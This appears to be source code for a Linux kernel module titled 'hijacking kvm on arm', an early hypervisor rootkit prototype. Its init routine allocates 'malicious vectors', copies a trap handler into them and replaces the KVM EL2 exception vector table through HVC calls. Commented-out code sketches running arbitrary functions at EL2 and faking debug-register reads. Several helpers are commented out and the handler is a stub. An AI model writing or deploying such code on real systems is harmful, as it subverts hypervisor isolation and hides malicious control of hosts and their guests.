#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kvm_host.h>
#include <asm/sysreg.h>

#include "include/kvmrk.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("hijacking kvm on arm");
MODULE_VERSION("0.01");


// /* ! CHANGES ! */
// #define HANDLE_TRAP_EL1_LENGTH 0x20
//
// void __attribute__((naked)) hijack_mdcr_el2(void) {
//     asm volatile("mrs x0, mdcr_el2\n\t");
//     asm volatile("orr x0, x0, %0\n\t" :: "i"(MDCR_EL2_TDA));
//     asm volatile("msr mdcr_el2, x0\n\t");
//     asm volatile("eret\n\t");
// }
//
//
// void __attribute__((naked)) handle_trap_el1(void) {
//     /* save el1 state */
//
//     /* x0 = KVMRK_CALL_HYP: x1 = physical address of function to run, runs function in el2 */
//     // asm volatile("br x1\n\t");
//     /* x0 = KVMRK_RESET_VECTORS, resets vectors */
//
//
//     /* check source of trap (access to mdcr_el2 or access to debug reg) */
//     /* if access to debug reg: check gp register accessed and write bogus value via swittch with every gp register ? */
//     /* if access to mdcr_el2: do the same (IMPLEMENT LATER !!) */
//     /* restore state */
//
//     asm volatile("eret\n\t");
// }
//
// void replace_vectors_el2(unsigned long new_vectors_pa) {
//     asm volatile("add x10, xzr, x0");
//     asm volatile("mov x0, %0\n\t" :: "i"(HVC_RESET_VECTORS));
//     asm volatile("hvc #0\n\t");
//
//     asm volatile("mov x0, %0\n\t" :: "i"(HVC_SET_VECTORS));
//     asm volatile("add x1, xzr, x10");
//     asm volatile("hvc #0\n\t");
// }
//
// void kvmrk_call_hyp(unsigned long func_pa) {
//     asm volatile("add x1, xzr, x0");
//     asm volatile("mov x0, %0\n\t" :: "i"(KVMRK_CALL_HYP));
//     asm volatile("hvc #0\n\t");
// }

static int __init kvmrk_init(void) {
    printk(KERN_INFO "kvmrk: module loaded\n");

    char *malicious_vectors = kmalloc(PAGE_SIZE, GFP_KERNEL);
    memcpy(malicious_vectors + 0x400, handle_trap_el1, handle_trap_el1_end - handle_trap_el1);
    printk(KERN_INFO "kvmrk: allocated malicious vectors @ VA %lx, PA %lx\n", malicious_vectors, virt_to_phys(malicious_vectors));

    replace_vectors_el2((unsigned long) virt_to_phys(malicious_vectors));
    printk(KERN_INFO "kvmrk: set malicious vectors\n");

    // kvmrk_call_hyp((unsigned long) virt_to_phys(hijack_mdcr_el2));
    // printk(KERN_INFO "kvmrk: called hijack_mdcr_el2\n");

    // asm volatile("mrs x0, dbgbcr0_el1");
    // printk(KERN_INFO "kvmrk: read DBGBCR0_EL1 from el1\n");

    return 0;
}

static void __exit kvmrk_exit(void) {
    printk(KERN_INFO "kvmrk: module unloaded\n");
}

module_init(kvmrk_init);
module_exit(kvmrk_exit);
